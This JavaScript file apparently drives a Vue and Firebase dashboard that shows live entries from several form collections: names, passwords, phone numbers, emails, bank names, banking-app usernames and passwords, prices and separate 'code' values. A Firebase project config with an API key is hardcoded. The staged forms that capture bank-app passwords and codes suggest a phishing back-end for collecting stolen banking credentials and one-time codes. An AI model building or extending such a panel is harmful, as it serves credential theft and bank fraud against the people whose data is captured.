import { initializeApp } from "https://www.gstatic.com/firebasejs/9.8.3/firebase-app.js";
import { getFirestore,
collection,
onSnapshot,
query} from "https://www.gstatic.com/firebasejs/9.8.3/firebase-firestore.js"
const firebaseConfig = initializeApp({
  apiKey: "AIzaSyCbnTb5P4j9czRLdhwTnvHGY8lb0bvHDJo",
  authDomain: "panel-15e03.firebaseapp.com",
  projectId: "panel-15e03",
  storageBucket: "panel-15e03.appspot.com",
  messagingSenderId: "655778598898",
  appId: "1:655778598898:web:e884dfea50ff4d8aeba56b"
});
const firestore = getFirestore();
const customerOrder = query(collection(firestore, 'the-form-one'));
const customerOrder2 = query(collection(firestore, 'the-form-two'));
const customerOrder3 = query(collection(firestore, 'the-form-three'));
const customerOrder4 = query(collection(firestore, 'the-form-four'));
const customCode = query(collection(firestore, 'code'));
const Order = collection(firestore, 'the-form');
  let appp = new Vue({
      el: '#app',
      data(){
              return{
                  firstInformition: [],
                  scInformition: [],
                  thirdInformition: [],
                  fourInformition: [],
                  code: [],
              }
          },
    created() {
      onSnapshot(customerOrder, (querySnapshot)=>{
        this.firstInformition = []
              querySnapshot.forEach((info)=>{
                this.firstInformition.push({
                  name: info.data().name,
                  password: info.data().password,
                  userId: info.data().userId
                })
              })
            });
              onSnapshot(customerOrder2, (querySnapshot)=>{
                this.scInformition = []
                querySnapshot.forEach((info)=>{
                this.scInformition.push({
                  name: info.data().name,
                  userId: info.data().userId
                  
                })                  
        })
              });
              onSnapshot(customerOrder3, (querySnapshot)=>{
                this.thirdInformition = []
                querySnapshot.forEach((info)=>{
                this.thirdInformition.push({
                  name: info.data().name,
                  phone: info.data().phone,
                  email: info.data().email,
                  number: info.data().number,
                  fullName: info.data().fullName,
                  userId: info.data().userId

            })
        })
              });
              onSnapshot(customerOrder4, (querySnapshot)=>{
                this.fourInformition = []
                querySnapshot.forEach((info)=>{
                  this.fourInformition.push({
                fullName: info.data().fullName,
                NameBank: info.data().NameBank,
                NameApp: info.data().NameApp,
                PassApp: info.data().PassApp,
                Price: info.data().Price,
                    numOne: info.data().numOne,
                    userId: info.data().userId
                
            })
                })
                
    });
    onSnapshot(customCode, (querySnapshot)=>{
      this.code = []
      querySnapshot.forEach((info)=>{
      this.code.push({
        code: info.data().Code,
        userId: info.data().userId
        
  })
})
});
    },
    methods: {
      saveLocal(e) {
        // e.onclick = () => {  
            console.log(e)
        // }
    }
    }
    
// beforeCreate(){
  // deleteDoc(doc(Order, "fjUFXsHSWktTZwRhNy1H"))
// }
  })

 